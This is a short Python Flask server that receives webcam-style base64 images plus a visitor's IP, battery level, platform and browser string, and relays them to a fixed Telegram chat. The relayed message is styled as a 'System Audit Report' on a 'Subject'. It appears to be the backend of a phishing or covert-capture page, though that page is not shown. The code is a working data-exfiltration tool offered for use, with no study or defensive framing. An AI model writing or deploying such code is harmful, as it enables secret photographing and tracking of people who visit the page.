import os
import base64
from flask import Flask, render_template, request, jsonify
import telebot

app = Flask(__name__)

# Security: Token will be picked from Render Environment Variables
BOT_TOKEN = os.getenv('BOT_TOKEN')
CHAT_ID = "7162565886"
bot = telebot.TeleBot(BOT_TOKEN)

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/upload', methods=['POST'])
def upload():
    try:
        data = request.json
        name = data.get('name', 'User')
        img_data = data.get('image')
        info = data.get('info', {})
        label = data.get('label', 'Audit Capture')

        # Professional English Report
        report = (
            f"🛡️ <b>SYSTEM AUDIT REPORT: {label}</b>\n\n"
            f"👤 <b>Subject Name:</b> {name}\n"
            f"🔋 <b>Battery Level:</b> {info.get('battery')}\n"
            f"🌐 <b>Network IP:</b> {request.remote_addr}\n"
            f"📱 <b>Platform:</b> {info.get('platform')}\n"
            f"🖥️ <b>User Agent:</b> {info.get('browser')[:50]}..."
        )

        if img_data:
            img_bytes = base64.b64decode(img_data.split(',')[1])
            bot.send_photo(CHAT_ID, img_bytes, caption=report, parse_mode='HTML')
        else:
            bot.send_message(CHAT_ID, report, parse_mode='HTML')
        
        return jsonify({"status": "success"})
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=10000)
    
